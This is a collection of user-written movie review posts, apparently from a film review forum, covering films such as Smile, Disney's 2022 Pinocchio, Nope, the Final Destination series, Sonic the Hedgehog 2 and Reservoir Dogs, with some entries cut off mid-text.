1664410479.0,Smile (2022): Spoiler-Free Review,"I was able to catch an advanced screening of ***Smile*** last night. It was an overall enjoyable thriller, but it did not reach the level of shock and terror that I experienced with ***The Ring*** (2002). Sosie Bacon's performance as Rose was very engaging and believable. I feel like the trailer revealed too many of the ""jump scares,"" so nothing really terrified me as I watched live. The story itself, however, focused on trauma and how we sometimes use smiling as a facade. This gave a fresh perspective in the movie.

I appreciate that ***Smile*** served as a loose sequel to Director Parker Finn's short, ***Laura Hasn't Slept***. From what I understand, the Blu-Ray release will have the short film attached to it. I am super-excited to see the 11-minute short.

I would say that comparable films to ***Smile*** are ***Fallen*** (1998), ***The Ring*** (2002), ***The Grudge*** (2004), ***Final Destination*** (2000), and ***Truth or Dare*** (2018). If you are fans of any of these films, I am sure that ***Smile*** will not disappoint.

1663891329.0,"Pinocchio review. 2022, Disney.","I had heard this movie was awful, and they were right. It's not even ""so bad it's funny"" (eg the other Pinocchio that at least has the funny voice acting), it's just outright bad. The 1940s version I'm comparing it to was much better.

The mix of live-action and CGI can be weird at times with things looking out of place. The CGI cat looks realistic but still looks weird and out of place, so why not just use a real cat? It looks like they tried to make the CGI goldfish look pretty but it's basically an abomination.

When we meet Geppetto he's basically a sad depressed old man living a sad life (even sadder given the implied backstory he had a wife and son who both died), and his idea of a night's entertainment is playing with his puppets (and terrorising his cat with them). Jimminy is still a bit of a perv around the female marionettes but this has been toned down compared to the 1940s version.

A couple of inconsistencies- Pinocchio knows what an agent is but doesn't know what a pile of poop on the ground is. Unclear why he knows what some words/things are but not others. Characters speak in English except when they greet each other or get angry which they use Italian for.

There's a bit of poetry and some sing-songs that are rather forgettable and mostly a bore. Voice acting is annoying- Pinocchio sounds a bit like Tails from the Sonic movies and the talking seagull is painful to listen to and sounds like a 70 year old woman losing her voice (which is actually the case).

Honest John is probably the most entertaining character. In this version one could argue Honest John is well-intentioned and a good guy since he lays the facts straight to Pinocchio that a conventional life won't work for him and if he's going to be laughed at by children he should be paid for it in the theatre. He doesn't recruit Pinocchio for Pleasure Island, Pinocchio is simply swooped up a net directly into the coach when it's time for the plot to progress.

There's a new character- a girl puppet and her puppeteer- who don't seem to add much other than the sake of having another character for Pinocchio to interact with.

Pleasure Island- First off it looks good and has good visuals, but to start with there's no cigars and no alcohol and the first impression we see is basically just a funfair that gives out free soft drinks. We later see kids smashing up stuff but it seems done in an orderly manner and the kids seem to dance and move about in a rehearsed manner, it just doesn't have the uncontrolled chaos vibe as 1940s Pleasure Island. At least the turning-into-donkey scene is still nightmare fuel.

Then we get to the Monstro scene(by this point I was getting bored). Nothing new other than an explanation how Geppetto managed to end up inside a whale(which is a sea-monster with spines and tentacles here).

In the end we never even find out if Pinocchio became a ""real boy"", just some touching but slightly-cringe words from his Father about how Pinocchio will always be a real boy to him on the inside or some crap. Girl puppet reveals Stromboli was sent to prison, we don't find out if the Coachman was ever caught.

Is it funny? No. Jokes and wit are very thin and stale.

Should you watch it? No. It's just boring. You'd be better watching the other version people made memes about at least then you can have a laugh at Pauly Shore's funny voice acting.",moviereviews,3378,614,65,0

But I guess that’s why surprises are always nice because I ended up enjoying this movie a lot more than I had anticipated. Starring pop culture favourites, Camila Mendes from Riverdale (2017) as Drea and Maya Hawke from Stranger Things (2016) as Eleanor, the two create an unlikely friendship born out of anger and vengeance. Filled with all the cattiness and edginess of teenage drama, Do Revenge is successfully reminiscent of high school movie classics like Easy A (2010) and Mean Girls (2004). While the basis of the movie isn’t exactly original, it still manages to feel distinctive enough to stand on its own.""

1662296527.0,Nope was a mind bending trip into the spectacle,"Jordan Peele's 'Nope; comes in with some big expectations due to Peele's previous work. 'Get Out' shifted the paradigm for horror movies, taking a genre which has historically been associated with a temporary experience of thrill and adrenaline, to being social commentaries on society and raising some deeper questions about ourselves in the process of watching his stories unfold.

Nope is no exception, and in fact it can be argued that it attempts to combine story, metaphor and meaning in a more ambitious way than his previous outings. Taking the central theme of 'spectacle', Peele beautifully illustrates its dangers and how we as a society are so obsessed with the spotlight to our own detriment (and even int he worst cases, eventual demise). Choosing a more science fiction approach this time around, Peele does a great job of story telling, and often subvert's out expectations time and time again in the process. Aside from the film's deeper meaning, some of the other highlights come in the form of the cinematography and performances from the central characters (mostly notably, OJ, Emerald and Angel). Peele has managed to create some complex characters which are highly relatable, and the chemistry between the actors is something which will be a lasting memory for me.

However, I do feel that the film does sacrifice plot and narrative in its relentless effort to hammer in the metaphor of the central theme - 'Spectacle'. While I did enjoy each story (OJ and the Animal Alien and Gordie and Jupe), I had a hard time understanding the relationship they had with each other from a narrative point of view. It often felt like two stories could have been played out better without the interference of the other. Other than that I did have some questions around OJ's motivations to tame / kill this animal, the legitimacy of the final impossible shot, the nature and behaviour the animal, and how / if OJ survived (or was this open for interpretation?). The ending of the film also was a slight let down with the death of the animal not being all that grand. This however could also be tied into the overall message of 'Spectacle' as the finale is often not worth the what we expect it to be.

Overall, I think Nope is a very good movie which will probably get better with a few re-watches to fully appreciate what Peele was trying to tell us with Nope.

1662068222.0,"My review of the 1992 film, My Cousin Vinny!","This was such a fun movie, with great performances, hilarious court room situations, a clear divide between northern and southern culture, and a blast of 90’s nostalgia and wardrobe.

This movie was so much fun to watch.  The jokes are set up perfectly to be complete misunderstandings or to backfire completely on the characters who think their pulling something over on someone.

The courtroom interactions are much different than the usual courtroom scenes.  The dialogue is quippy and funny and the sheer amount of times Vinny was held in contempt was hysterical on it’s own.

The film really thrived on it’s analysis of culture shock.  The clear differences between the cultures both in the courtroom and just daily life of the southern and Northern America.

This is probably one of Joe Pesci’s best roles.  He was spot on with every joke and he legitimately turned in some good dramatic moments as well, in the end turning out to be a pretty good lawyer.

Marisa Tomei was fantastic in this movie.  She stole every scene she was in.  Her humor and wit were perfect for this type of story.  Her chemistry with Pesci was so good that it really made this movie work perfectly, especially towards the end.

Though Macchio and Whitfield weren’t in the movie all that much, their bumbling start to the film really sold the premise and made the whole concept believable and got the whole story and tone of the film rolling.

This is a great movie that pretty perfectly mixes the courtroom genre with comedy.  Pesci’s chemistry with multiple characters provides some great moments and the rest of the cast was spot on.

*Warning: This movie is very weird*


Plot: Doctor Toru Yano is given what appears to be a dead, tadpole-like creature. Reports come in of a gigantic creature attacking an oil freighter out at sea. Yano’s son, Ken, is convinced that whatever his dad received is actually part of the creature. Yano decides to go scuba diving near where the fisherman found that thing, but the doctor gets attacked by the creature, leaving half of his face scarred. Ken calls the creature Hedorah since the creature appears sludge-like. After experimenting on the creature some more, *Seriously, why don’t you rest? You’ve just been attacked.* the doctor discovers that the creature is rejuvenated when polluted water is added. Later that night, Hedorah sprouts legs and goes ashore. Hedorah crashes a party, *The party is one of many weird scenes in this movie.* but then your boy Godzilla shows up to kick some ass…


Characters: While the acting is again solid, none of the characters give a stand out performance for me. 



Tone: This movie is supposed to be a mix of seriousness and goofiness, but it’s hard to tell in this movie. There’s even some weird animated segments that I don’t know what they’re supposed to be. This movie can’t really decide what it wants to be. A horror film? A children’s film? An environmental movie? A Godzilla movie? Maybe it’s a mix of all of those.


Music: The music in this movie is a mix between horror and the regular Godzilla fun of the other movies. At times, it can feel hopeful, yet suspenseful at the same time. In my opinion, only “Opening” and “Give Back The Sun! I-III” are the most memorable songs to me. An honorable mention to “Godzilla In Flight” for obvious reasons.


Godzilla and other monsters: Okay, this movie makes it hard for me to decide which monster had the better performance since I enjoyed both monsters. I’ll start with Godzilla. Godzilla has done some weird moments throughout the movies, [but this speaks for itself.]( This is Godzilla’s first movie where he’s portrayed as a superhero, and in my opinion, he did a pretty good job. For Hedorah, I think he’s unique. His design is cool and I think he makes a fitting monster antagonist, although he does cause most of the “horror” portion of the movie.


All in all, this is a really weird entry in the series, but it’s definitely something to check out if you want.

1659270511.0,Cannibal Holocaust is... Actually Really Good??," What do you guys think of the INFAMOUS film Cannibal Holocaust? And do you think it's immoral?  


 Whether you've seen it or not, you probably know about its reputation as being arguably one of the most fucked up and disturbing movies out there. And if you don't - Well best stay clear for the faint of heart lol.   
But along with the films reputation though comes a surprisingly well made film with some more in depth themes than you'd expect given the poster and title...   In my mind Cannibal Holocaust is... unfortunately actually a pretty good film that explores a story of savagery in a really clever and unique way. As the film delves into some pretty nasty stuff on screen though it also has some important things to say as it shows the comparison between the titular cannibalistic tribe within the film as compared to mainstream society and has the viewer asking themselves who the real Savages are? As well as having them wonder what is and isn't ok to show on screen.  


 Whether your for or against the film itself though you can't deny that it's infinitely interesting.  So what are your thoughts on this highly controversial film? And if you want to hear me hack a bit further into what I think the film means check out my video essay on the film here: [

*Jurassic World Dominion* conveniently unearths the very same building blocks which had powered *Jurassic Park* almost 3 decades ago, sizzles them with up-to-date CGI and an overload of new characters and dinosaurs, and calls it an ‘epic conclusion’. Fine if you just want to indulge in some big-screen dino action or catch-up with legacy characters, but beyond that, the stale story and humor will crush you alive as you realize that they absolutely have no intention to conclude this cash-cow franchise

&#x200B;



 

This is the obvious choice, no FD fan thinks this movie is good. I have met some people who say they think the movie is so bad it's good or it's their guilty pleasure but even they admit it's shit compared to the other ones. The goofy 3-D effects and the shitty character writing (one of the character's entire personality is that they are racist and they actually drop the N word ) were just the piss in this already shitty cereal. 4/10

Pros:

\-Some of my favourite kills of the franchisie are from part 4, those ones being the mechanic's girlfriend getting splatered by a tire and the douchy buff dude getting his organs sucked out through his anus while drowning.

\-The opening credits were AMAZING. My favourite deaths of the franchise being shot in a silly CGI skeleton style while a random hard rock song is playing in the background was epic.

\-The ending where the 3 survivors get hit by a truck going through the glass window while being shot in X-ray vision was honestly kind of funny.

\-The premonition where Lori gets squished by an escalator was also amazing.

\-In the behind the scenes the special effects people actually set a car on fire and have it go around a green screened slide, which is the most lit shit I've ever seen.

Cons:

\-This is the only movie in the FD franchise that has a fucking scene in it which feels really out of place.

\-The 3-D effects and most of the kills are offensive.

\-This is the only movie in the franchise which doesn't feature Tony Todd at all, not even his grim voice.

\-One of the kills in this movie is literally just an immitation of Terry's death from FD 1.

\-The premonitions aren't relatable. I have never been to a racing event making this premonition not that relatable. The franchise includes planes, car accidents, rollercoasters, BRIDGES. Another issue of mine with the premonitions are that some of them don't make any sense, some of them are literally just CGI scisors and horseshoes flying around.

\-The protaogonist is forgetable to the point where I literally forgot his gender and how he looked.

Final Destination 5 (2009):

&#x200B;



 

This movie is a BIG improvement to the franchise, everyone believed that the franchise will be shit after part 4 but this movie proved them wrong. After part 4 was miraculously the highest grossing movie of the franchise (earning 186,2 million dollars) they decided to make another movie which was really greedy cause part 4 was meant to be the finale of the franchise hence the name ''The Final Destination''. But this movie was far more relatable and entertaining. 7.1/10

Pros:

\-This movie wasn't over the top 3-D unlike part 4. I actually had no idea of this movie being shot in 3-D until Dead Meat James said it was.

\-The premonition was much scarier because I always had to be driven through a bridge so that I could buy stuff at my local LIDL shop and I was always like: ""What if this bridge collapses and I die?"")

\-Olivia's and Candice's death we're very anxiety inducing the atmosphere of Candice's death was way scarier than the actual kick-ass death, just the way she played around that nail with her feet was waaay more painful than anything else, and Olivia's death was horrifying because I always had fucked up eyes and needed glasses so seeing her eye get fucked up during that surgery was just a big ewie from me.

\-Tony Todd is back. That's all that matters.

\-The ending was THE PERFECT TWIST. The heartbreaking way we see the survivors from the movie getting killed of in the plane was depressing but it was the perfect way to wrap up the franchise for good.

Cons:

\-This one is very dumb and nitpicky and I might be the only one who has this problem but if you have noticed all of the sequels come 3 years after the other (FD (2000), FD 2 (2003), FD 3 (2006), FD 4 (2009)) and the release date of this movie (2011) really bugs me.

\-This movie can be as amazing as it is but it was still a cash grab inspired by the box office sucess of part 4 which is really greedy but it did work, making this movie the 2nd highest grossing movie of the franchise (grossing 157,9 million dollars).

\-This movie doesn't have the same amount of fun as the first 3 movies, it is kinda boring at times.

\-In the ending, aldo it's great, Sam and Molly dying is really unlikeable but it is still better than the dumb deaths the other premonitioners had.

Final Destination 3 (2006):

&#x200B;



 

Part 1 and 2 might have been terrfying and scared generations for years to come but this mvoie, aldo still scary at times is mainly a fun watch that I couldn't reccomend enough. FD 3 featuring the underrated and talented Mary Elizabeth Winstead (MEW) as our main lead and premonitioner takes us into a very fun and entertaining story with a ton of great kills. My favourite FD death is actually from part 3 if you we're wondering and no it's not the tanning beds death, aldo that one is in my top 5 but we will get to that later. This movie has no bad kills really, I think they are all pretty decent and wellmade. 7.9/10

Pros:

\-The kills are really gruesome here, especially the nailgun death. I was already anxious about nailguns and how painful it would be to get nailguned on the finger, but my entire skull? No thank you. The tanning beds are also pretty scary.

\-The way the burning tanning beds transfer into the caskets with the dead Ashley sisters was extremly funny.

\-MWE is very talented here and this movie has the best acting in my opinion.

\-The vibrant colors are very fun to look at.

\-The ""Choose Their Fates"" extension was very goofy and fun and I feel pity for anyone who didn't get to play it.

\-Wendy (just like me) loves taking photos of pretty much everything when she goes somewhere making this character pretty relatable to me.

Cons:

\-Some of the kills are cheaply covered up with CGI blood which is a big waste of potential.

\-I dislike the ending. It's not that the train crashes and the character's die it's just that everyone counts Wendy as dead too. I have watched this movie enough times to know that Wendy wouldn't just stay there waiting for the train to hit her. She would climb out.

Final Destination 2 (2003):

&#x200B;



 

FD 2 is not 2nd on the list, it's actually a tie beetween part 1 because I love both of the movies equally. Part 2 is amazing in almost every way, and yet it was the lowest grossing film of the franchise making it the hidden gem of the franchise. This one is the most effective scare-wise because of the now infamous dodgy log truck scene which scared drivers all around the world. The characters here are the best and there are many ways this movie is better than part 1 but it's still a tie. 8.6/10

Pros:

\-The characters are much more memorable, Kimberly the AMAZING replacement for Alex Browning, Rory the drug addict, Kat the bussiness woman, Nora the mom and many others.

\-The cast here is the most good looking cast in any movie. Rory, Kim, Clear and Kat are absolute BABES.

\-Clear Rivers and William Bludworth return!

\-Many people shit on the acting of this movie but I thought it was really good.

\-Kimberly's 3 really annoying and stupid friends die so we don't have to deal with them.

\-The log truck premonition is very cool to look at as the ballet of madness casually unfolds.

\-I do like the idea of a couple of high school friends surviving an accident but I do think that a couple of random strangers surviving is more realistic.

Cons:

\-My 2 least favourite kills of the franchise are from part 2. Those 2 being Alex Browning getting killed with a brick inbeetween movies and Clear Rivers's lame explosion. I would hated the death less if the makers of FD 2 kept the unused scene where Clear is happy that it's over for her misery.

\-Aldo I do like Clear's blonde hair I still would have prefered if Clear was a brunette in this version.

\-Nora's death is ridicilously over the top and very mean considering what she went through.

Final Destination (2000):

&#x200B;



 

Part 1 is a forever classic and will always hold a special place in my heart along with part 2, 3 and 5. The concept was very original and disturbing. It made airplanes scary as much as Jaws made ocean scary and all of the deaths are memorable and gory. This movie stars Devon Sawa as an excellent protaogonist who has the very graphic and gory premonitions. This movie also stars Ali Larter as the amazing Clear Rivers and one of the best opening scenes ever. 8.6/10

Pros:

\-This movie works excellently as a teen thriller.

\-Clear Rivers is a great final girl and she is my 5th favourite one actually.

\-All of the deaths are really cool and I actually prefered when we would see Death set up the traps instead of just seeing the motions that would led up to the death.

\-This is one of those movies (and franchises) where people would look onto 20 years later and be like ""That thing is forever a classic""

\-It stars Candyman himself as the scary and mysterious William Bludworth.

Cons;

\-Valrie's death is ridicilously over the top, it's such a miserable way to die, that the kill is just...What the fu-

\-This isn't really a con but I just find it stupidly funny how death cleans up the crime scene of Tod's death and how it's shadow is seen on Valerie's teapot.

And now the fun part!

Top 10 deaths:

10. Nadia Monroy (Decapitated and splattered with a flying tire)

9. Kat Jennings (Forehead impaled by PVC pipe)

8. Olivia Castle (Slipped on a teddy bear eye and then crashed through the window)

7. Candice Hooper (Spine snapped after falling from a set of gymnastics bars)

6. Hunt Wynorski (Organs sucked out of his anus while drowning)

5. Tod Waggner (Strangled by a clothesline in a shower)

4. Terry Chaney (Hit by a bus)

3. Ashley and Ashlyn (Burned alive in tanning beds)

2. Rory Peters (Trisected by flying barbed wire)

1. Erin Ulmer (Shot in the skull and through her face by a nailgun)

Top 5 characters:

5. Ian McKinley and Erin Ulmer (Final Destination 3)

4. Alex Browning (Final Destination)

3. Kimberly Corman (Final Destination 2)

2. Wendy Christensen (Final Destination 3)

1. Clear Rivers and Rory Peters (Final Destination 1 and 2)

1656093217.0,Bohemian Rhapsody review:,"Worth watching. If anything this film is worth watching. I found it tragic and sad, but it left me with some good messages. Throughout the film, you see a lot of Freddie Mercury‘s ups and downs and the family bond that he had with the other members of the band. However, an issue with it for me was the pacing. I have been rewatching parts of it which have eased my opinion of the pacing a little, but still, at parts the pacing felt off. I thought when it came to Freddie leaving the band and coming back, the pacing between those two points did not work. I did though think the cut between the song “Bohemian Rhapsody”  receiving negative reviews in its first ever playing on the radio and then cutting to years later and showing them performing it at a concert was a good cut that felt fluent. 

Beyond the cuts, there was the acting. I don’t know what it was but besides Rami Malek and Gwilym Lee, the rest of the actors were very meh. Obviously, Rami Malek’s role as Freddie Mercury himself was the stand out of them all, but I felt Gwilym was actually pretty good as Brian May. The others were not horrible, they just didn’t give off the same strength or emotion in their roles. 

Through everything this film provides during it‘s 2:14 minute runtime, the last 50 minutes hit me the  hardest. The moment where Freddie wakes up on his couch coughing and his ex wife comes to visit him, is where this film really caught me. The sad emotion that you feel from this point on is pretty extreme. Toward the end, I was really fighting off tears. I can’t tell how much Freddie’s speech to Paul Prenter about fruit flies got to me. I would have to say this movie has a lot of deep and amazing quotes in it. (I hope they were what the real Freddie Mercury said). 

Overall, this film is a 7/10 for me. If you want a good biopic, definitely watch it!",moviereviews,1845,347,38,0

1654707841.0,"Sonic the Hedgehog 2 (2022) is not only better than the first movie, but a lot more fun. (Spoiler Review!)","
Before we start, this review will contain spoilers, but as of the moment I’m typing this, the film is already out on digital. I’m sure there’s some people that still haven’t seen it yet, and do not want the movie to be spoiled for them. 

Okay, so literally a day after I posted my review of the first Sonic movie, I saw the second movie. Before I give my thoughts on the sequel, I wanna say a few things: I’ll admit that I was a little worried after hearing reviews say that the first movie was better, and the sequel was getting bad reviews. As of the time I’m typing this, Sonic the Hedgehog 2 has 69% on Rotten Tomatoes, while the first movie has 63%. I was really excited when the trailers for the second movie started popping up on YouTube. At that time, I have gotten more into the Sonic franchise and began to appreciate the first movie a lot more. (I even enjoyed the Easter eggs in the first movie). When I finally saw the second movie, I not only enjoyed it more than the first movie, but I think this maybe the best video game movie of all time.

Pros:

* The characters. Sonic and all the human characters return for the sequel, and meet some new characters along the way. I feel as though Sonic in this movie has grown up not only as a better character, but more of a teenager, while trying to be responsible. (Which is also accurate to the games). Jim Carrey is always entertaining, and in this one, he’s probably the funniest character since he has the best jokes. The other human characters (both returning and new) are equally as entertaining and funny. As for Sonic’s new friends (Tails and Knuckles), they were not only fun, but also great to see them on the big screen. Tails makes for an excellent sidekick to Sonic, but you often care about him whenever something bad happens to him. As for Knuckles, I thought that he was done well. In other movies, you’d have the typical dumb guy taking everything so seriously, and there are some cases where that can work. In this movie, this works for Knuckles. It gives him more of a personality and makes him more likable.
* Embracing the video game side of Sonic. Like I said before, I really enjoyed the Easter eggs in the first movie. The second movie not only has more Easter eggs to music, characters, the games, and even internet memes, but this movie seems to really enjoy being a video game movie. (I think that’s also why it’s doing so well right now). Like in the first movie, the people involved with this movie really did their homework, and made sure not to include too much stuff. One of my favorite sequences in the movie is when Sonic is trying to get to the master emerald before Knuckles and Dr. Robotnik. This part of the movie feels the most video game like out of the whole movie.
* Super Sonic. In the games, Super Sonic is an awesome character. It was awesome seeing him in the second movie, but almost everyone that was a Sonic fan knew that was coming. I hope we can see more of him in Sonic the Hedgehog 3. (While it’s on my mind, will we get to see Tails and Knuckles go super? I believe those are characters in one of the games).
* Post credit scene. Comparing this to the post credit scene in the first movie, the post credit scene in the second movie is obviously better. Shadow the Hedgehog is my all time favorite Sonic character, and I really hope that they do his character justice in the third movie. 

Cons: 

* Some scenes go on for too long. I get that they wanna fill up the runtime, but there’s some scenes that I wouldn’t mind cutting. For example, I don’t mind the wedding scene at all, but parts of it seems to drag on. Another example is the dancing scene. While I can see it as a way for Sonic and Tails to develop their friendship, why couldn’t Sonic just do the slow motion thing like in the first movie and get the map that way?



In conclusion, I really enjoyed how Sonic the Hedgehog 2 improves on the original, and how much more fun it is.

1653842467.0,Why The Hunchback of Notre Dame is my favorite Disney movie of all time,"Disney is known for a lot of things. Disney is known for the theme parks, creating various characters, and creating some of the greatest animated movies of all time, such as: The Lion King, Up, Toy Story, Beauty and the Beast, etc. All of these are why Disney’s still going strong today. (So good that Disney pretty much owns half of your childhood now). Some of their animated movies are still remembered to this day, but there are some movies that aren’t as well beloved. Case in point: The Hunchback of Notre Dame. 

When I was younger, I remember hearing about The Hunchback of Notre Dame and thinking that it was Disney’s hidden masterpiece. So I found the movie at Walmart and decided to watch it, and I immediately fell in love with it. When I was getting older, I’ve noticed that Disney seemed to remember the movie as well, because they would often play music from the movie in the parks, and the gift shops would sell merchandise from the movie. I’ve decided to rewatch the movie recently so I can see if it was still the underrated masterpiece that I remembered. As you can guess, I love the movie to this day and has remained my favorite Disney movie to this day. 

Positives:

* Characters:

Disney movies are filled with fun characters. Characters can help give life to a movie, if they’re done correctly. Good characters are well written so the audience can relate to whatever the characters are going through. For the characters in Hunchback, they are a lot of fun. (Well, most of them are, but I’ll get to that later). Quasimodo just wants to go outside and live among the people. I feel as though kids who are often shut indoors can relate to him. Esmeralda is a good character that cares about Quasimodo and fights for the gypsies. Phoebus is the captain of the guard who doesn’t approve of Frollo’s methods and saves people. I also found Clopin to be a fun and entertaining character too. And then there’s the villain: Frollo. For me, there’s four types of villains I like: The first kind is a villain that stays evil throughout the whole movie; The second kind is a villain who has a redemption at the end; The third is a villain who you feel sorry for; And the last one is a villain who is just fun. Frollo is a mix of one and four. Every time he’s on screen, he steals the show for me. He has this intimidating voice and you can feel how threatening he is, even though he’s doing everything that is God’s will. The music also adds to how cool he is.

* Music:

As with most Disney movies, the characters are accompanied with songs. The songs should help the audience understand the character’s thoughts and feelings during a problem that the characters are facing. Also, the songs should be memorable too. For Hunchback, the songs aren’t only memorable, but I think this is the best soundtrack out of any Disney movie. Most of the songs in the movie are accompanied by this epic choir that I think makes the movie feel more epic and grand. While “The Bells of Notre Dame” and “Out There” are well done, my favorite song in the movie is “Hellfire”. This is the song where the movie really gets epic. While it’s awesome to listen to, I think the use of dark imagery while being beautifully animated is what makes the song really standout from the others. 

* Visuals

Most of the visuals done in this movie are really impressive. The Notre Dame cathedral is beautiful and massive. 


Negatives:

Remember how I said some of the characters aren’t that fun? This mainly is talking about the gargoyles. First of all, one good thing I’ll say is that one of them is voiced by Jason Alexander. (And it was awesome hearing Mary Wickes in her final role). And second of all, the gargoyles are not that good of friends to Quasimodo. They’re jerks and they really don’t help carry the movie’s main theme. 

My second complaint is some of the CGI does not look good. While some use of early CGI looks good (as pointed out earlier) the people in the background don’t look great at all.

All in all, The Hunchback of Notre Dame is a impressive animated movie and is by far the greatest Disney movie I’ve ever seen.

1653748246.0,The Bob’s Burgers Movie (2022): 10-Category Review,"The Bob's Burgers Movie meets expectations. It's funny, purposeful, and developed enough to maintain investment. Fundamentally, it's a murder mystery, but also intertwines Bob's money issues (which is the emotional force). Plus, Louise is intrinsically motivated to prove her bravery, making her the main protagonist and giving her the clearest arc. Bob's Burgers doesn't have the tightest crafted humor, but these dynamic characters help it connect emotionally. The film is still lighthearted and silly (with skilled setup and payoff), but it peppers in enough drama to create substance. Thus, Bob's Burgers succeeds because it delivers a sincere combination of laughs and relatability. 

Technically, Bob's Burgers is proficient. Surprisingly, there are musical numbers that heighten the soundtrack, cinematography, editing, and direction. There is dramatic lighting, framing, and camerawork. Also, passing cuts, smash cuts, and time lapses help the comedic rhythm. Furthermore, voice acting is ranged, animation is personal, and CGI is supportive. Punchlines are heightened by exaggerated music, transitions, and surrealism. Overall, the filmmaking reinforces the humorous mood. It isn't high art, but it possesses consistent craft. Therefore, Bob's Burgers is a fairly enjoyable experience. Viewers should expect skilled comedy and decent emotions.

1651064608.0,Iron Man (2008): 10-Category Review,"Iron Man kickstarted a juggernaut franchise, but is fairly ordinary alone. The story is formulaic and its arc is contradictory. Specifically, Stark denounces weapons manufacturing after almost dying from a missile. However, he then builds Iron Man (a highly sophisticated weapon). The film paints him as an honorable peacekeeper. Yet in reality, he's a violent vigilante. It would've made more thematic sense for Stark to advance medical technology, but action was the predetermined goal here. Overall, Downey is a perfect fit, the dialogue has clever quips, and the plot is decently paced. It's just hard to digest Stark's illogical progression.

Meanwhile, Iron Man's craft is passable. The only noticeable visuals are a few hero shots. The soundtrack has some classic rock songs yet isn't particularly impactful. The editing does a minor timeline manipulation, but lacks any stylish transitions or elevated sequences. The effects are significant but also have awkward combinations of CGI bodies with real faces. Plus, the direction is almost intentionally voiceless and neutral. Really, the only clear strengths are the complex sound (with symbolic touches) and the recognizable production design. Ultimately, Iron Man doesn't have many blatant flaws, but doesn't have powerful strengths either.

1650980958.0,"The Good, the Bad and the Ugly (1966)","The Good, the Bad and the Ugly is iconic. Its plot of bandits searching for treasure is seemingly simple, but deconstructs many ideals. The film examines notions of heroes, violence, war, and greed by presenting honest complexities. Protagonists are cruel, immorality is explained through backstories, violence is brutal, and war tragically destroys everything in its path. Thus, the self-interested characters are understandable reflections of their decaying world. Eastwood isn't deep, but Wallach counterbalances that with shifty desperation. Ultimately, this movie challenges viewers to reconsider romanticized ideals of action heroes who glorify violence in morally simplistic stories.

Technically, The Good, the Bad and the Ugly is equally naturalistic, yet vibrantly stylish. The production has gritty details, yet grand scope. The effects are elaborate, real, and downright dangerous. The cinematography combines picturesque wide-shots with striking close-ups. The editing slowly builds tension, yet erupts with dramatic cuts that elevate suspense. Plus, these aspects are unified by Leone's legendary direction, creating a rugged yet beautiful atmosphere that redefined cinema. Finally, Morricone's music is possibly the greatest score of all time. Consequently, The Good, the Bad and the Ugly is a cinematic marvel. Undeniably, it's one of the best films ever.

1650810320.0,The Bad Guys (2022): 10-Category Review,"The Bad Guys showcases many talents. It's artful, fun, energetic, and cute. The characters are defined, the plot is engaged, and the sentimentality lands. The narrative isn't special, but the witty dialogue and consistent twists offset that. Plus, the voice acting is entertaining. Each performer has fun, and Rockwell grounds everything by balancing slickness with vulnerability. Furthermore, the humor files. Some jokes are for children, but most of the comedy can be enjoyed by everyone. Lastly, the script is tightly structured, which paces nicely. The second act sags some, but generally, The Bad Guys always has a new development around the corner.

Technically, The Bad Guys is cohesively stylized. The beautiful animation unites illustrative comic book designs with detailed CGI textures, creating a visual experience that's the best of both worlds. The action pops because the cinematography is intentionally active, while the choreography is masterfully coordinated. The editing is swift, with smooth transitions. The sound is embellished and symbolic. The jazz music matches the heist genre and the pop additions support the hip mood. Also, the cast is a collection of recognizable voices with skilled range. Ultimately, The Bad Guys is a carefully crafted, flavorful ride. Despite its predictability, all audiences should find it delightful.

1650716302.0,The Unbearable Weight of Massive Talent (2022): 10-Category Review,"The Unbearable Weight of Massive Talent is a standard action comedy elevated by meta aspects. Particularly, Nicolas Cage as himself is a great gimmick since he's embraced his meme status. Still, Massive Talent is a missed opportunity because it's otherwise generic. The self-awareness is fun, the self-deprecation works, the Cage/Pascal chemistry is endearing, and the ending is heartfelt. However, the plot is lacking. Massive Talent admits that talky comedy and shoehorned action are lowbrow, yet plays into those tropes. The climax especially devolves into forgettable modern formulas. Therefore, Massive Talent combines wit with mediocrity, making it a mixed bag.

Meanwhile, Massive Talent's technicals are minor. There's fitting music, believable production, and blending sound transitions. The editing is noticeable because it serves punchlines and maintains a tight runtime. However, the cinematography isn't proactive, the effects are sparse (besides a young Nick alter ego), and the direction is basic. The tone takes itself just seriously enough, but the presentation of this material is bland. Ultimately, Nicolas Cage's commitment, Pascal's innocence, and the vulnerable family drama drive Massive Talent, but only so far. It's a fun movie that Cage fans should enjoy, but don't expect much else.

1650288062.0,Father Stu (2022): 10-Category Review,"Father Stu presents a loaded topic with mixed execution. It has uniqueness, but Father Stu undercuts that with generic mistakes. Specifically, Stuart Long's rebellious expression of Catholicism is accessible to non-believers. Unfortunately, that’s supported by slim philosophy and insincere resolutions. Father Stu takes viewer buy-in for granted and focuses on unearned inspiration to simulate progression. This contrived writing squanders the refreshing protagonist. Therefore, instead of reaching skeptics (like Long was known for), Father Stu preaches to the choir. Plus, Wahlberg's casting is overpowering. He's good, but the faint material is overshadowed by his persona.

Technically, Father Stu is decent, yet bland. Its positives are the energetic music, involved aging make-up, and symbolic sound. Conversely, the visuals are completely uninteresting. There's one meaningful upside-down shot, but that's it. Furthermore, the editing is equally basic, never heightening drama or thematic energy. Thus, the film blurs into a vague series of events, feeling less impactful than they should. Also, the third act drags because the film isn’t paced or structured. Overall, the filmmaking has virtues, but fails to create a clear tone or emotional arc for audiences. Consequently, Father Stu misses its opportunity to produce converts.

1650060129.0,An Analysis of Reservoir Dogs Part 1,"Reservoir Dogs was made in 1992 and is the first film directed by the acclaimed Quentin Tarantino. It stars Harvey Keitel, Tim Roth, Steve Buscemi, Michael Madsen, Chris Penn and Lawrence Tierney. The film follows a group of criminals in the aftermath of a jewellery heist gone wrong.

The first scene in Reservoir Dogs is particularly magnificent as it not only reveals to the audience the type of characters these men are, but shows Tarantino's signature type of dialogue in the first scene of his first movie (Not including True Romance). The scene takes place in a diner of sorts with the 'Dogs' sitting around a table having a casual conversation about Madonna's ""Like a Virgin"". Mr Brown leads the conversation claiming the song is about a promiscuous woman who has sex with a man with a big dick, and thus reminding her of when she lost her virginity. It is here where we are first exposed to Tarantino dialogue. The conversation taking place has no effect on the plot yet adds a layer of realism as the characters talk about pop culture. Where most films will only use dialogue for character development or to further the plot, Tarantino cleverly makes a conversation have no effect on the film yet is instantly relatable as conversations such as these take place on a daily basis. We as the audience are interested in the conversation as it seems natural and funny. During this conversation, a smaller minor conflict arises between Mr White and Joe Cabbot (Keitel and Tierney.) As Joe is reading names out of a book Mr White snatches the book from him after becoming frustrating with Cabbot's constant muttering which leads to a minor argument between the two. Neither side wants 